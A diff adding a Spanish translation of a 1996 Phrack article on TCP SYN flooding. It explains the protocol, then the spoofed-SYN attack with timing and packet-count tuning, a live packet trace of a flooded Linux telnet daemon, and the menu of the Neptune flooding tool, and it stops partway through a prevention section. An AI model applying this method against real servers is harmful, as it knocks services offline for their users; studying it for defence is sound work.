@@ -1,0 +1,1394 @@
+---- { R16_06 } --------------------------------------------------------------
+
+-------- { Proyecto Neptuno (Flood TCP SYN) } --------------------------------
+
+--- { PiErCinG }
+
+
+        Documento  aparecido  en " Phrack  Magazine ".  Volumen  Siete, Numero
+Cuarenta y ocho, Fichero 13.
+
+
+			     [ Proyecto Neptuno ]
+
+			by daemon9 / route / infinity
+			     for Phrack Magazine
+		      July 1996 Guild Productions, kid
+
+		       comments to route@infonexus.com
+
+
+        Este proyecto es un analisis para entender el flood TCP SYN. Y os
+debeis estar preguntando, porque tratar de una manera tan extensa el flood
+TCP SYN? Aparentemente, alguien debia de hacerlo. Este alguien resulto
+ser yo mismo (necesito un verdadero hobby). El proyecto SYNflood consiste en
+esta guia, que incluye anotaciones de volcado de monitorizaciones de red y
+un robusto codigo fuente para Linux completamente funcional.
+
+
+                --[ Introduccion ]--
+
+        El flood TCP SYN es un ataque del tipo denegacion de servicio (Denial
+of service - DOS). Como la mayoria de los ataques del tipo DOS, no explota un
+fallo o bug del software, pero si una escasez en la implementacion de un
+protocolo determinado. Por ejemplo los ataques DOS del tipo mail bombing 
+funcionan porque muchos agentes SMTP son tontos y aceptan cualquier cosa que
+se les envia. Los floods ICMP_ECHO explotan el hecho que muchos kernels
+simplemente responderan los paquetes de peticion ICMP_ECHO uno tras otro, de
+manera infinita. Como veremos los ataques DOS del tipo flood TCP SYN funcionan
+gracias a la actual implementacion del protocolo de establecimiento de
+conexion de TCP.
+
+
+                --[ Prologo  ]--
+
+        Esta guia pretende ser una completa introduccion al flood TCP SYN (al
+cual nos referiremos a partir de ahora como flood SYN). Esto cubrira el ataque
+de una manera detallada, incluyendo toda la informacion basica relevante
+necesaria. La organizaremos en secciones:
+
+        Seccion I.      Informacion basica sobre TCP.
+        Seccion II.     Las estructuras de memoria de TCP y el Backlog
+        Seccion III.    Procesamiento de la entrada de TCP
+        Seccion IV.     El ataque
+        Seccion V.      La traza de red
+        Seccion VI.     Neptune.c
+        Seccion VII.    Discusion y prevencion
+        Seccion VIII.   Referencias
+
+(Nota: seria conveniente para los lectores que no esten familiarizados con el
+protocolo TCP/IP se leyeran el siguiente texto: 
+ftp://ftp.infonexus.com/pub/Philes/NetTech/TCP-IP/tcipIp.intro.txt.gz)
+
+
+
+         	--[ Los Jugadores ]--
+
+
+                A:      Host destino
+                X:      Host inalcanzable 
+                Z:      Host atacante
+	     Z(x):	Atacante enmascarado como el inalcanzable
+
+
+                --[ Los graficos ]--
+                
+
+                Hay algunos graficos de transacciones de red en esta guia
+que seran interpretadas de la siguiente manera:
+
+       tick   host a      control     host b
+
+tick:
+        Una unidad de tiempo. No hay distincion sobre *cuanto* tiempo existe
+entre ticks, simplemente pasa ese tiempo. Generalmente no supondra una gran
+espera.
+host a:
+        Una maquina que participa en una conversacion basada en TCP.
+control:
+	Este campo muestra los bits relevantes de control que aparecen en
+las cabeceras TCP y la direccion en la que fluye la informacion.
+host b:
+        Una maquina que participa en una conversacion basada en TCP.
+
+Por ejemplo:
+
+        1       A       ---SYN--->      B       
+
+	En este caso, en el primer punto de referencia en el tiempo, el 
+host a esta enviando una trama TCP al host b con el bit de SYN activado.
+A menos que se indique, generalmente desconoceremos la parte de datos de la
+trama TCP.
+
+
+
+                Seccion I.      Informacion basica sobre TCP
+
+        TCP es un protocolo de transporte orientado a la conexion. TCP es
+responsable de esconder las interioridades de red a las capas superiores. Un
+protocolo orientado a la conexion implica que los dos hosts que participan en
+una conversacion primero deben establecer una conexion antes de cualquier
+intercambio de datos. En el caso de TCP, esto se realiza con el saludo de las 
+tres fases. La fiabilidad puede ser provista de diferentes maneras, pero las
+dos unicas que nos conciernen son la secuencia de datos y los ACK
+(acknowledgement o confirmacion). El TCP asigna numeros de secuencia a cada
+byte en cada trama y confirma todos los bytes de datos que recibe del otro 
+lado. (ACKs utilizan un numero de secuencia, pero no son por si mismos
+confirmados).
+
+
+                 --[ Establecimiento de conexion TCP ]--
+
+ 	Para intercambiar datos usando TCP, los hosts deben establecer una
+conexion. El TCP establece una conexion en un proceso de 3 fases denominado
+el saludo de las tres fases. Si la maquina A esta corriendo un programa
+cliente y desea conectarse a un programa servidor en la maquina B, el
+proceso que realiza es el siguiente:
+
+                        fig(1)
+       
+        1       A       ---SYN--->      B       
+
+        2       A    <---SYN/ACK---     B
+
+        3       A       ---ACK--->      B
+
+                                
+        En (1) el cliente le esta diciendo al servidor que quiere una
+conexion. Este es el unico proposito del flag de SYN (bit de SYN activado).
+El cliente le esta diciendo al servidor que el campo del numero de secuencia
+es valido, y deberia comprobarlo. El cliente pondra el campo de numero de
+secuencia en la cabecera TCP con el valor de ISN (initial sequence number, o 
+numero de inicio de secuencia). El servidor, al recibir esa trama (2)
+respondera con su propio ISN (por tanto el flag de SYN esta activado) y una
+ACK-confirmacion de la primera trama del cliente (que es el ISN del
+cliente + 1).
+El cliente entonces confirma (ACK) el ISN del servidor (3). Ahora ya puede
+dar comienzo la transmision de datos.
+
+
+              --[ Flags de control TCP ]--
+
+	Existen seis flags de control de TCP. Aunque solo tendremos en cuenta
+tres de ellos, aqui estan todos incluidos:
+
+*SYN:   Numeros de sincronizacion de secuencia.
+        El campo de numeros de sincronizacion de secuencia es valido. Este
+flag solo es valido durante el saludo de las tres fases. Indica al receptor
+del TCP que valide el campo de numero de secuencia, y que anote dicho valor
+como el numero de secuencia inicial indicador de conexion (iniciado
+normalmente por el cliente). Los numeros de secuencia en TCP pueden ser
+sencillamente considerados como contadores de 32 bits, y su rango va de 0 
+a 4,294,967,295. Cada byte de los datos intercambiados a traves de una
+conexion TCP (junto con ciertos flags) es secuencial. El campo de numero de
+secuencia en la cabecera TCP contendra el numero de secuencia del *primer*
+byte de datos en la trama TCP.
+
+*ACK:   Acknowledgement(Confirmacion)
+        El campo numerico de confirmacion es valido. Este flag esta casi
+siempre indicado. El campo numerico de confirmacion de la cabecera TCP
+guarda el valor del siguiente numero de secuencia *esperado* (del otro lado),
+y tambien confirma *todos* los datos (del otro lado) hasta este numero de ACK
+menos uno.
+
+*RST:	Reset
+        Destruye la conexion referenciada. Todas las estructuras de memoria
+son inicializadas.
+
+URG:	Urgente
+        El puntero urgente es valido. Esta es la manera en TCP de implementar
+OOB (out of band). Por ejemplo, en una conexion mediante telnet, un 'ctrl-c'
+por parte del cliente se considera urgente y causara que este flag este
+activo.
+
+PSH:	Push
+        El receptor TCP no deberia encolar estos datos, mas bien deberia
+pasarlos a la aplicacion tan pronto como pueda. Este flag siempre deberia
+estar activado en conexiones interactivas, como las de telnet y rlogin.
+
+FIN:	Finish
+        El emisor TCP ha acabado de transmitir datos, pero todavia esta
+abierto a acceptar datos.
+
+
+                --[ Puertos ]--
+
+
+        Para garantizar accesos simultaneos al modulo de TCP, el TCP
+provee una interfaz de usuario denominada puerto. Los puertos son usados 
+por el kernel para identificar procesos de red. Ellos son estrictamente 
+entidades de la capa de transporte. Junto con una direccion IP, un puerto
+TCP provee un punto final para las comunicaciones de red. De hecho, en 
+cualquier momento *todas* las conexiones en Internet pueden describirse 
+con cuatro numeros: la direccion IP origen y el puerto origen, y la
+direccion IP destino y el puerto destino. Los servidores son accesibles
+a puertos conocidos asi que ellos pueden estar localizables en un puerto
+estandard en diferentes sistemas. Por ejemplo el daemon de telnet se situa
+en el puerto TCP 23.
+
+
+
+        Seccion II.     Las estructuras de memoria de TCP y el Backlog
+
+	Para un buen tratamiento del tema del SYNflood, es necesario 
+echarle un vistazo a las estructuras de memoria que crea el TCP cuando llega 
+un cliente SYN y la conexion esta pendiente (una conexion que esta en
+algun lugar del proceso del saludo de las tres fases y el TCP esta en el
+estado de envio_SYN o recepcion_SYN)
+
+
+		--[ BSD ]--		
+
+        Bajo el codigo de red del estilo BSD, para cada peticion de conexion
+pendiente de TCP existen tres estructuras de memoria que esten localizadas
+(no discutiremos sobre la estructura de proceso y la estructura de ficheros, 
+pero el lector debe estar advertido de que existen.):
+
+Socket Structure (socket{}):
+        Guarda informacion relativa al extremo local del enlace de
+comunicaciones: el protocolo utilizado, informacion de estado, informacion de
+direccionamiento, colas de conexion, buffers y flags.
+
+Internet Protocol Control Block Structure (inpcb{}):
+	Los PCB's se utilizan en la capa de transporte de TCP (y UDP) para
+guardar varios fragmentos de informacion necesaria para TCP. En ellos se
+guardan: informacion del estado TCP, informacion de direcciones IP, numeros
+de puertos, prototipos de cabeceras IP y opciones y un puntero a la entrada 
+a la tabla de enrutamiento para las direcciones destino. Los PCB's son 
+creados para un servidor basado en TCP cuando el servidor llama a la funcion
+listen().
+
+TCP Control Block Structure (tcpcb{}):
+        El bloque de control TCP contiene informacion especifica del TCP como
+informacion del timer, informacion del numero de secuencia, estado del flujo
+de control, y datos OOB.
+
+
+		--[ Linux ]--
+
+        Linux utiliza un esquema diferente de asignacion de memoria para
+guardar informacion de red. La estructura de socket todavia se utiliza, pero
+en vez de pcb{} y tcpcb{}, tenemos lo siguiente:
+
+Sock Structure (sock{}):
+        Informacion especifica del protocolo, la mayoria de las estructuras
+de datos son del tipo TCP. Esta es una estructura amplia.
+
+SK Structure (sk_buff{}):
+        Guarda mas informacion especifica del protocolo incluyendo informacion
+de las cabeceras de los paquetes, tambien contiene sock{}.
+
+Segun Alan Cox:
+	El inodo es el inodo que guarda el socket (debe de ser un inodo de 
+prueba para sockets que no pertenecen al sistema de ficheros como IP), el 
+socket guarda metodos genericos de alto nivel y la estructura sock es el
+objeto especifico del protocolo, aunque algunos items experimentales de
+alto rendimiento utilizan la misma estructura generica sock y el codigo de
+soporte. Eso guarda cadenas de buffers lineales (estructura sk_buff's).
+
+[estruct. inodo -> estruct. socket -> estruct. sock -> cadenas de sk_buff's]
+
+
+
+		--[ La Cola de Backlog]--
+
+	
+	Son grandes estructuras de memoria. Cada vez que un SYN cliente llega 
+a un puerto valido (un puerto donde el servidor TCP esta listen()
+escuchando), deben estar reservadas. Si no existiera ningun limite, un host
+ocupado podria facilmente acabar con toda su memoria simplemente tratando de
+procesar las conexiones TCP. (Esto seria incluso un simple ataque del tipo
+DOS de denegacion de servicio). De cualquier forma, existe un limite maximo
+de apilar las peticiones concurrentes de conexion que puede tener el TCP en
+espera para un socket determinado. Este limite es el backlog y es la longitud
+de la cola donde las conexiones de entrada (todavia incompletas) se mantienen.
+Este limite de cola se aplica de forma identica para el numero de conexiones
+incompletas(el saludo de las tres fases no ha sido completado) y para el 
+numero de conexiones completas que no han sido extraidas de la cola por la
+aplicacion llamando a la funcion accept(). Si se alcanza este limite de
+backlog, nos daremos cuenta de que el TCP desestimara sigilosamente todas
+las peticiones de conexion de llegada hasta que las conexiones pendientes
+puedan ser tratadas.
+  
+	El backlog no es un valor muy elevado. No debe serlo. Normalmente el 
+TCP es bastante expeditivo en el proceso de establecimiento de conexion.
+Incluso si una conexion llego mientras la cola estaba llena, cuando el
+cliente retransmite su trama de peticion de conexion, el receptor TCP tendra
+de nuevo espacio en su cola. Diferentes implementaciones del TCP tienen 
+diferentes tama¤os de backlog. Bajo el codigo de red del estilo BSD, tambien
+hay un 'grace' margen de 3/2. Esto significa que el TCP permitira un maximo
+de backlog*3/2+1 conexiones. Esto permitira a un socket una conexion incluso
+si llama a listen con un backlog de 0. Algunos valores comunes de backlog:
+
+                        fig(2)
+
+   OS		Backlog	  BL+'Grace'  Notas	
+---------------------------------------------------------------------------
+SunOS 4.x.x:	 5    	     8 
+IRIX 5.2:	 5	     8
+Solaris
+Linux 1.2.x: 	10	    10   Linux no tiene este 'grace' margen.
+FreeBSD 2.1.0:  	    32
+FreeBSD 2.1.5:		   128
+Win NTs 3.5.1:	 6	     6   NT no parece que tenga este margen.
+Win NTw 4.0:     6           6   NT tiene un backlog patetico.
+
+
+
+
+                Seccion III.    Procesamiento de la entrada de TCP
+
+
+        Para ver exactamente donde actua el ataque es necesario observar
+como la recepcion en TCP procesa una trama de llegada. Lo que se expone
+acto seguido es valido para el estilo de red BSD, y solo los procesos
+relevantes a esta guia son analizados.
+
+Un paquete llega y es desmultiplexado desde la pila de protocolos hasta 
+TCP. El estado de TCP es LISTEN (escuchando):
+
+Obtener la informacion de cabecera:
+        El TCP obtiene las cabeceras TCP e IP y almacena la informacion en
+memoria.
+Verificar el checksum TCP:
+	El checksum estandard de internet se aplica a toda la trama. Si 
+esta comprobacion falla, no se envia ningun ACK, y se rechaza la trama,
+asumiendo que el cliente la retransmitira.
+
+Localizar el PCB{}:
+        El TCP localiza el PCB{} asociado con la conexion. Si no se
+encuentra, el TCP rechaza la trama y envia un RST. (Esta es la manera en 
+que TCP maneja las conexiones que llegan a los puertos en los cuales el 
+servidor no esta escuchando). Si el PCB{} existe, pero el estado es CLOSED
+(cerrado), el servidor no ha realizado las llamadas a las funciones 
+connect() o listen(). La trama se rechaza, pero no se envia ningun RST. Se
+espera que el cliente retransmita su peticion de conexion. Veremos este
+caso cuando hablemos de 'Anomalias en Linux'.
+
+Crear un nuevo socket:
+	Cuando llega una trama a un socket en escucha -listen()-, se crea un 
+socket esclavo. Aqui es donde se crean un socket{}, tcpcb{}, y otro pcb{}. 
+TCP no es sometido a la conexion en este momento, asi que se activa un
+flag para provocar que el TCP rechace el socket (y destruir las estructuras 
+de memoria) si se encuentra un error. Si se alcanza el limite de backlog, el
+TCP lo considera un error, y se rechaza la conexion. Veremos que esta es
+exactamente la causa de que funcione el ataque. De otra manera, el nuevo 
+estado TCP del socket es LISTEN (en escucha), y se intenta completar la 
+apertura pasiva.
+Rechazar si RST, ACK, o no SYN:
+	Si la trama contiene un RST, se rechaza. Si contiene un ACK, se 
+rechaza, se envia un RST y se inicializan las estructuras de memoria (el
+ACK no le da sentido a la conexion en este punto, y es considerado un
+error). Si la trama no tiene el bit de SYN activado, se rechaza. Si la 
+trama contiene un SYN, continua el procesamiento.
+Procesamiento de la direccion, etc:
+        El TCP entonces escribe la informacion de direccion del cliente en
+un buffer y conecta su pcb{} al cliente, procesa las opciones del TCP e 
+inicializa su numero de secuencia de envio inicial(ISS).
+ACK el SYN:
+        El TCP envia un SYN, ISS y un ACK al cliente. El timer de
+establecimiento de conexion se pone a 75 segundos. El estado cambia a
+SYN_RCVD. Ahora, TCP esta sometido al socket. Observaremos que
+este es el estado en que estara el destino TCP cuando enviemos el
+ataque porque la esperada respuesta del cliente nunca se recibe. El estado 
+permanece en SYN_RCVD hasta que el timer de establecimiento de conexion se
+agota, en cuyo caso todas las estructuras de memoria asociadas con la 
+conexion son destruidas, y el socket retorna al estado de LISTEN.
+
+
+                Seccion IV.     El Ataque
+
+        Una conexion TCP se inicia con un cliente enviando una peticion a
+un servidor con el flag de SYN en la cabecera TCP. Normalmente el servidor 
+devolvera un SYN/ACK al cliente identificado por la direccion origen de
+32 bits en la cabecera IP. Entonces el cliente enviara un ACK al servidor
+(Como vimos en la figura 1) y ya puede comenzar la transferencia de datos. 
+Cuando la direccion IP del cliente se oculta tras una IP de un servidor
+inalcanzable, de cualquier manera, el TCP objetivo no puede completar el 
+saludo de las tres fases y continuara intentandolo hasta que se agote el
+tiempo. Esta es la base del ataque.
+        El host atacante envia unas cuantas (vimos que solo con 6 ya es
+suficiente) peticiones SYN al puerto TCP destino (por ejemplo, el daemon de 
+telnet). El host atacante se debe asegurar que la direccion IP de origen es
+falsificada (IP-spoofing) con otra direccion de un host inalcanzable (el TCP
+destino estara enviando su respuesta a esta direccion). IP (a traves de
+ICMP) informara al TCP que el host es inalcanzable, pero TCP considera estos
+errores como transitorios y deja su resolucion al IP (re-enrutar los
+paquetes, etc) ignorandolos de manera efectiva. La direccion IP debe ser
+inalcanzable porque el atacante no quiere que *ningun* host reciba los
+SYN/ACKs que le estaran llegando del TCP destino, la cual cosa provocaria un
+RST por parte de dicho host (como vimos en la entrada en TCP). Esto haria
+fracasar el ataque. El proceso es el siguiente:
+
+
+			fig(3)
+
+	1	Z(x)    ---SYN--->	A
+
+		Z(x)    ---SYN--->	A
+
+		Z(x)    ---SYN--->	A
+
+		Z(x)    ---SYN--->	A
+
+		Z(x)    ---SYN--->	A
+
+		Z(x)    ---SYN--->	A
+
+
+	2	X    <---SYN/ACK--- 	A
+
+		X    <---SYN/ACK---	A
+
+			...
+
+	3	X      <---RST---	A
+
+
+En (1) el host atacante envia una serie de peticiones SYN al destino para
+llenar su cola de backlog con conexiones pendientes. (2) El destino responde 
+con SYN/ACKs hacia la direccion que cree que es el destino de los SYN de
+entrada. Durante ese tiempo todas las peticiones a este puerto TCP seran
+ignoradas. El puerto destino esta colapsado(floodeado).
+
+
+                --[ Anomalias en Linux ]--
+
+        Haciendo la investigacion para este proyecto, me di cuenta de un
+error de implementacion muy extra¤o en el modulo TCP de Linux. Cuando un
+servidor TCP en particular es floodeado en un host Linux, suceden
+cosas extra¤as...Primero parece que el timer de establecimiento de conexion
+se rompe. Las 10 peticiones de conexion falsificadas mantienen los sockets
+en el estado de SYN_RCVD durante 20 minutos (23 minutos para ser exactos. 
+Me pregunto cual es el significado de esto...Hmmm...). Bastante mas que los
+75 segundos que *deberia* estar. La siguiente anomalia es todavia mas
+extra¤a...Despues de ese aparente periodo de tiempo arbitrario (tengo que
+determinar que demonios pasa), el TCP mueve los sockets floodeados al 
+estado de CLOSED (cerrados), en el cual *permanecen* hasta que una peticion
+de conexion llega a un puerto *diferente*. Si una peticion de conexion
+llega al puerto floodeado (ahora en el estado de CERRADO), este no 
+respondera, actuando como si todavia estubiera floodeado. Despues de que
+una peticion de conexion llegue a un puerto diferente, los sockets CERRADOS
+son destruidos, y el puerto floodeado estara libre de nuevo para atender
+peticiones. Parece como si la peticion de conexion estancara los sockets
+CERRADOS llamando a listen()... Maldito sea el que me lo pregunte...
+
+	Lo que esto implica es importante. Yo he sido capaz de deshabilitar 
+por completo todos los servidores basados en TCP de responder las 
+peticiones indefinidamente. Si todos los servidores TCP son floodeados, no 
+hay ninguno que reciba las peticiones de conexion validas para aliviar el
+estado de CERRADO de las conexiones floodeadas. Malas noticias en cualquier 
+caso.
+	[Nota: a 15/07/1996 esto sigue sin resolverse. He contactado con 
+Alan Cox y Eric Schenk y he planeado el trabajar con ellos en una solucion
+a este problema. Ya expondre todos nuestros descubrimientos tan pronto
+como sea posible. Creo que el problema viene encaminado por una posible 
+mentira (al menos en parte) en la funcion tcp_close_pending()....O quizas
+existe un error logico en la manera que el TCP cambia entre el timer de
+establecimiento de conexion y el timer de mantenerse-vivo. Ambos son
+implementados usando la misma variable siendo mutuamente exclusivos...]
+	
+
+
+                Seccion V.      La traza de red
+
+        Lo que sigue es una traza de red de una sesion real de SYN flooding.
+La maquina objetivo es Ash, una box Linux 1.2.13. El atacante es Onyx. La red
+es una ethernet a 10Mbps.
+
+Network Monitor trace  Fri 07/12/96 10:23:34  Flood1.TXT
+
+Frame   Time   Src MAC Addr   Dst MAC Addr   Protocol     Description                                                       Src Other Addr  Dst Other Addr  Type Other Addr
+
+1       2.519   onyx           ash            TCP/23       ....S., len:    4, seq:3580643269, ack:1380647758, win:  512, src 192.168.2.2     192.168.2.7     IP
+2       2.520   ash            onyx           TCP/1510     .A..S., len:    4, seq: 659642873, ack:3580643270, win:14335, src 192.168.2.7     192.168.2.2     IP
+3       2.520   onyx           ash            TCP/23       .A...., len:    0, seq:3580643270, ack: 659642874, win:14260, src 192.168.2.2     192.168.2.7     IP
+
+	Un cliente telnet se inicia en Onyx, y podemos observar el 
+        estandar saludo de las tres fases entre los dos hosts para la
+        sesion de telnet.
+
+Las filas 4-126 eran trafico interactivo de telnet y no aportaban nada a la
+guia.
+
+127     12.804  ash            onyx           TCP/1510     .A...F, len:    0, seq: 659643408, ack:3580643401, win:14335, src 192.168.2.7     192.168.2.2     IP
+128     12.804  onyx           ash            TCP/23       .A...., len:    0, seq:3580643401, ack: 659643409, win:14322, src 192.168.2.2     192.168.2.7     IP
+129     12.805  onyx           ash            TCP/23       .A...F, len:    0, seq:3580643401, ack: 659643409, win:14335, src 192.168.2.2     192.168.2.7     IP
+130     12.805  ash            onyx           TCP/1510     .A...., len:    0, seq: 659643409, ack:3580643402, win:14334, src 192.168.2.7     192.168.2.2     IP
+
+        Aqui vemos el proceso de fin de conexion de 4 fases.
+
+	En este punto, se inicia el programa de flood en Onyx, se llena la
+        informacion, y se lanza el ataque.
+
+131     42.251  onyx           *BROADCAST     ARP_RARP  ARP: Request, Target IP: 192.168.2.7                                                               
+
+        Onyx esta intentando obtener la direccion ethernet de ash
+	mediante ARP.
+	
+132     42.251  ash            onyx           ARP_RARP  ARP: Reply, Target IP: 192.168.2.2 Target Hdwr Addr: 0020AF2311D7                                  
+
+        Ash responde con su direccion ethernet.
+
+133     42.252  onyx           ash            TCP/23       ....S., len:    0, seq:3364942082, ack:         0, win:  242, src 192.168.2.10    192.168.2.7     IP
+
+        Empieza el flood. Onyx envia el primero de las 10 tramas TCP con el
+        bit de SYN activado, y la direccion IP falsificada al daemon telnet.
+
+134     42.252  ash            *BROADCAST     ARP_RARP  ARP: Request, Target IP: 192.168.2.10                                                              
+
+        Ash inmediatamente intenta resolver la direccion ethernet. Asi,
+        como no hay ningun host en la red (y ningun router para procesar
+        la peticion) la peticion ARP no sera respuesta. El host es, en
+	efecto, inalcanzable.
+
+135     42.271  onyx           ash            TCP/23       ....S., len:    0, seq:3381719298, ack:         0, win:  242, src 192.168.2.10    192.168.2.7     IP
+136     42.291  onyx           ash            TCP/23       ....S., len:    0, seq:3398496514, ack:         0, win:  242, src 192.168.2.10    192.168.2.7     IP
+137     42.311  onyx           ash            TCP/23       ....S., len:    0, seq:3415273730, ack:         0, win:  242, src 192.168.2.10    192.168.2.7     IP
+138     42.331  onyx           ash            TCP/23       ....S., len:    0, seq:3432050946, ack:         0, win:  242, src 192.168.2.10    192.168.2.7     IP
+139     42.351  onyx           ash            TCP/23       ....S., len:    0, seq:3448828162, ack:         0, win:  242, src 192.168.2.10    192.168.2.7     IP
+140     42.371  onyx           ash            TCP/23       ....S., len:    0, seq:3465605378, ack:         0, win:  242, src 192.168.2.10    192.168.2.7     IP
+141     42.391  onyx           ash            TCP/23       ....S., len:    0, seq:3482382594, ack:         0, win:  242, src 192.168.2.10    192.168.2.7     IP
+142     42.411  onyx           ash            TCP/23       ....S., len:    0, seq:3499159810, ack:         0, win:  242, src 192.168.2.10    192.168.2.7     IP
+143     42.431  onyx           ash            TCP/23       ....S., len:    0, seq:3515937026, ack:         0, win:  242, src 192.168.2.10    192.168.2.7     IP
+
+        Los siguientes 9 de 10 SYNs. El daemon telnet en ash esta ahora
+	floodeado. En este punto, se inicia otro cliente telnet en Onyx.
+
+144     47.227  onyx           *BROADCAST     ARP_RARP  ARP: Request, Target IP: 192.168.2.7                                                               
+
+        Onyx esta de nuevo intentando obtener la direccion ethernet
+        utilizando ARP. Hmmm, esta entrada deberia estar en la cache arp.
+        Ya lo investigare.
+
+145     47.228  ash            onyx           ARP_RARP  ARP: Reply, Target IP: 192.168.2.2 Target Hdwr Addr: 0020AF2311D7                                  
+
+        Aqui esta la respuesta de ARP.
+
+146     47.228  onyx           ash            TCP/23       ....S., len:    4, seq:3625358638, ack:         0, win:  512, src 192.168.2.2     192.168.2.7     IP
+147     50.230  onyx           ash            TCP/23       ....S., len:    4, seq:3625358638, ack:         0, win:14335, src 192.168.2.2     192.168.2.7     IP
+148     56.239  onyx           ash            TCP/23       ....S., len:    4, seq:3625358638, ack:         0, win:14335, src 192.168.2.2     192.168.2.7     IP
+
+        Onyx esta intentando establecer una conexion con el daemon telnet
+        en Ash, el cual esta, como vimos, floodeado.
+
+149     67.251  ash            *BROADCAST     ARP_RARP  ARP: Request, Target IP: 192.168.2.10                                                              
+
+        Ash continua intentando obtener la direccion ethernet del host
+	falsificado. En vano...
+
+150     68.247  onyx           ash            TCP/23       ....S., len:    4, seq:3625358638, ack:         0, win:14335, src 192.168.2.2     192.168.2.7     IP
+151     92.254  onyx           ash            TCP/23       ....S., len:    4, seq:3625358638, ack:         0, win:14335, src 192.168.2.2     192.168.2.7     IP
+
+
+        Onyx esta todavia transmitiendo sus peticiones de establecimiento
+        de conexion...Tambien en vano.
+
+152     92.258  ash            *BROADCAST     ARP_RARP  ARP: Request, Target IP: 192.168.2.10                                                              
+
+        Hola? Estas por ahi?
+
+
+
+
+                Seccion VI.     Neptune.c
+
+        Neptune.c es el codigo adjunto. Realiza todo lo que hemos hablado, y
+mas. Neptune.c es bastante mas complejo de lo necesario. He incluido algunas
+caracteristicas que no son esenciales, pero que hacen que el programa sea
+mas robusto. Las caracteristicas del programa: un sistema de menus facil de
+usar, una interface de linea de comandos alternativa para una facil
+integracion con scripts, peticiones ICMP_ECHO para preguntar si los
+inalcanzables son, de hecho, inalcanzables (ping AKA), modo infinity (leer 
+el codigo) y un modo daemon con (pseudo) eleccion de direcciones IP
+aleatorias inalcanzables.
+
+        El menu es realmente explicito...
+
+1		Enter target host
+
+Introduce el host objetivo. Si estas indeciso, matate tu mismo.
+
+2		Enter source (unreachable) host
+
+Introduce el supuesto emisor. Este host ha de ser rutable pero no alcanzable. 
+Recuerda que la direccion ha de ser unicast. Si es una direccion broadcast o
+multicast sera rechazada por el TCP destino.
+
+3		Send ICMP_ECHO(s) to unreachable
+
+Asegurate que el supuesto emisor es de hecho inalcanzable. Esto no es 100%
+fiable pues A) Los paquetes ICMP pueden ser rechazados por la no-fiable 
+capa de red, B) el host podria filtrar los paquetes ICMP_ECHO.
+
+4		Enter port number to flood
+
+El puerto destino a floodear. Hay infinidad de opciones.
+
+5		Enter number of SYNs
+
+El numero de SYNs a enviar. Recuerda, este ataque no necesita mucho ancho
+de banda, enviar mas paquetes de lo necesario es totalmente inutil.
+
+6		Quit
+
+Adiooos.
+
+7		Launch
+
+Dispara cuando estes listo.
+
+
+8               Daemonize (puede o no estar implementado en tu version)
+
+Pone el programa en modo daemon. Se pone en background y realiza sus 
+diabluras alli. Necesita dos opciones mas: intervalo de envio de paquetes,
+y tiempo de vida del daemon. El intervalo de envio de paquetes recomendado
+es, por lo menos, 90 segundos, dependiendo del TCP destino. con 80 deberia
+funcionar bien, ya que el timer de establecimiento de conexion es de 75
+segundos. El tiempo de vida del daemon queda a tu eleccion. Se bueno.
+        La parte del daemon tambien incluye rutinas para hacer uso
+opcional de un fichero de direcciones IP inalcanzables y escogerlas 
+(pseudo) aleatoriamente. El programa lee el fichero y construye un array 
+dinamico de estas direcciones IP en el orden de byte de red y entonces
+utiliza rand (con la semilla de la hora del dia en segundos---no
+necesitamos mucha entropia aqui, esto no es criptografia---) para generar
+un numero y entonces lo modifica con el numero de entradas en la tabla de
+hash en una direccion IP concreta.
+
+	Como el programa abre sockets 'raw', necesita ser ejecutado como root. 
+Por defecto, se instala SUID root en /usr/local/bin/neptune con la lista de 
+acceso en /etc/sfaccess.conf. El mecanismo de identificacion trabaja
+comprobando los nombres de usuario (via UID) de los que intentan floodear. No 
+es un complejo algoritmo, y de hecho el codigo es bastante simple (si alguien
+encuentra cualquier error de seguridad con el programa siendo SUID root,--cabe 
+notar el hecho que el programa es admitidamente diabolico--me encantaria
+escucharles). Root es la unica entrada que acepta el fichero de acceso.
+	Para que funcione el programa, necesitas borrar las marcas de 
+comentarios de la linea 318 (la llamada a sendto() donde se envian los
+datagramas). Hice esto para que los idiotas simplemente interesados 
+en causar problemas (y que no esten interesados en aprender) encontraran el
+programa totalmente inutil.
+
+
+
+                Seccion VII.    Discusion y prevencion
+
+	Como hemos visto, el ataque funciona porque el TCP intenta hacer su 
+trabajo de proveer un transporte fiable. El TCP debe establecer una conexion
+primero, y aqui es donde se encuentra la debilidad. (T/TCP es inmune a este
+ataque via TAO. Lee mi proximo documento: `La Proxima Generacion Internet`
+para informacion del T/TCP y IPng.). Bajo circunstancias normales, asumiendo
+el buen comportamiento del software de red, lo peor que puede pasar es que 
+un servidor basado en TCP pueda ser 'wrapped-up' en el legitimo proceso de
+establecimiento de conexion y unos pocos clientes deban retransmitir sus
+SYNs. Pero un programa cliente 'misbegotten' puede explotar esta debilidad de 
+establecimiento de conexion y parar un servidor basado en TCP con solo unas
+tramas manipuladas.
+	Es importante remarcar el hecho de que el SYNflood requiere una 
+minima cantidad de trafico de red para ser tan efectivo. Considera otros
+ataques de red del tipo DOS como los floods ICMP_ECHO (ping floods), mail 
+bombs, subscripciones masivas a listas de correo, etc... Para ser efectivos, 
+todos estos ataques necesitan que un atacante transmita cantidades 
+voluminosas de trafico de red. No solo provoca que estos ataques sean mas
+detectados en ambos extremos decrementando la cantidad de ancho de banda 
+disponible (como tal, a menudo estos ataques son 'waged' de maquinas 
+comprometedoras) sino que tambien se a¤ade a los problemas generales de
+trafico en Internet. El flood SYN puede ser mortalmente efectivo con solo
+360 paquetes/hora.
+
+
+
+                --[ Prevencion ]--
+
+	Vale, y como lo paramos?  Buena pregunta. 
+
+
+
+		--[ TCPd ]--
+
+        Los TCP 'wrappers' son casi inutiles. La magia que hacen se basa en
+la validacion de la direccion IP origen de los datagramas de entrada. Como
+sabemos, esto puede ser falsificado con aquello que desee el atacante. Al 
+menos que el objetivo haya negado el trafico a *todo el mundo* excepto hosts
+conocidos, los TCP 'wrappers' no te salvaran.
+
+
+
+		--[ Incrementa el Backlog ]--
+
+        Incrementar el backlog por defecto no es una buena solucion. En
+comparacion con la dificultad de un atacante que simplemente envia mas
+paquetes, los requerimientos de memoria de las estructuras adicionales de 
+establecimiento de conexion es prohibitivamente caro. Como mucho es una
+medida ofuscante.
+
+
+		--[ Filtrado de Paquetes ]--
+
+        Un peque¤o filtro de paquetes (o modificacion del kernel) de
+cualquier tipo podria ser una solucion viable. Brevemente:
+
+- El host mantiene un log reciente de paquetes de entrada con el bit de 
+SYN activado en una estructura de lista enlazada.
+- La lista enlazada no se permite que crezca sin comprobarla (se 
+presentaria otro ataque DOS).
